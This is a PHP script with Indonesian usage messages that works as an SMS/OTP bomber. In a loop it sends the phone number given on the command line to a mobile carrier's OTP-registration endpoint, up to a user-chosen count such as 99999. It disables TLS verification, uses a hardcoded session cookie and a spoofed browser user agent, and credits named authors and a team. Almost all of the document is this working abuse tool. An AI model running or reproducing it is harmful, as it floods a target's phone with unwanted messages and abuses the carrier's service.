<?php
function banner(){
system('cls') or system('clear');
print "============================================\n";
print " Author : MFx99  ||  CP : +6282113782871 \n";
print "============================================\n";
print "Developer: MIFTAHUDIN || Aditya Pramudya S\n";
print "============================================\n";
print "  Thx For AM-TEAM And All Member AM-TEAM  \n";
print "============================================\n";
}
if (empty($argv[1]) or empty($argv[2])) {
banner();
echo "Cara Pakai : php ".$argv[0]." NomorHP jumlah\n";
echo "Contoh : ";
echo "php ".$argv[0]." 0895xxxxxxxx 99999\n";
}
else {
banner();
$request = $argv[2];
for ($x=1; $x<=$request; $x++) {
sleep(2);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"https://registrasi.tri.co.id/daftar/generateOTP");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=".$argv[1]);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Cookie: PHPSESSID=5noisam2cugiq25l6374u79975',
'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.62 Safari/537.36',
'Accept: application/json, text/javascript, */*; q=0.01'
));
$server_output = curl_exec ($ch);
curl_close ($ch);
$server_output = json_decode($server_output, TRUE);
if ($server_output['status'] == "success") {
echo "[".$x."/".$request."][".$argv[1]."] SUKSES\n";
}
else {
echo "[".$x."/".$request."][".$argv[1]."] GAGAL!\n";
}
}
}
?>
sleep 5
sh tools.sh
